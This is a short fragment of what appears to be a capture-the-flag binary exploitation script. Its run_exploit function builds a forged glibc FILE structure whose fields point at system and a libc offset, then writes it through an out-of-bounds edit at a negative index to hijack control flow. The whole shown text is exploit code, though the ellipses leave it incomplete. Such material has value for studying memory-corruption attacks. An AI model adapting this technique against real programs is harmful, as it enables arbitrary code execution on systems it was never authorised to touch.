...
def run_exploit():
    ...
    payload = pack_file(0,IO_buf,IO_buf,IO_buf,0,0xffffffffffffffff,IO_buf,0,
        (shell-100)/2,0,0,0,0,stdin,1,_lock,_wide_data,_mode)+p64(libc_base+0x3e8350)+p64(system)
    edit(-6, payload)
